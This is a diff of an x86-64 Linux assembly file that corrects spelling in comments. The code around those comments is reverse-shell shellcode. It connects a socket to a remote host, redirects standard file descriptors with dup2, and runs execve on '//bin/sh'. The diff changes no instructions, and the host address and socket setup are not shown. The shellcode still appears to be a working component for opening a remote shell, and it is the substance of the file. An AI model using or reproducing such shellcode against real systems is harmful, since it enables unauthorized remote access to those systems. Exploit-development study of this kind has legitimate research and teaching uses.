@@ -5,7 +5,7 @@ global _start
 
 _start:
 
-	;clean refisters
+	;clean registers
 
 	xor rax,rax
 	xor rdi,rdi
@@ -35,7 +35,7 @@ _start:
 	mov rsi,rsp 				;sock_adress
 	mov dl,16				;sock_adress_len
 
-	mov al,42				;sys_cponnect syscall
+	mov al,42				;sys_connect syscall
 	syscall
 
 	;duplicate file descriptor
@@ -44,7 +44,7 @@ _start:
 	xor rsi,rsi				;clean rsi
 
 	mov al,33				;dup2 syscall
-	syscall 				;rsi alrdy set to 0
+	syscall 				;rsi already set to 0
 
 	mov al,33				;dup2 syscall
 	mov sil,1
@@ -67,7 +67,7 @@ _start:
         push r12				;push a null POINTER for the structure end
         push rdi				;push the adress of "//bin/sh" on the stack
         mov rsi,rsp				;put the structure start adress in rsi
-        xor rdx,rdx				;set rdx to null bc no env variables
+        xor rdx,rdx				;set rdx to null because there is no environment variable
         mov al,59				;set rax to 59 for execve
         syscall					;syscall to execve
 
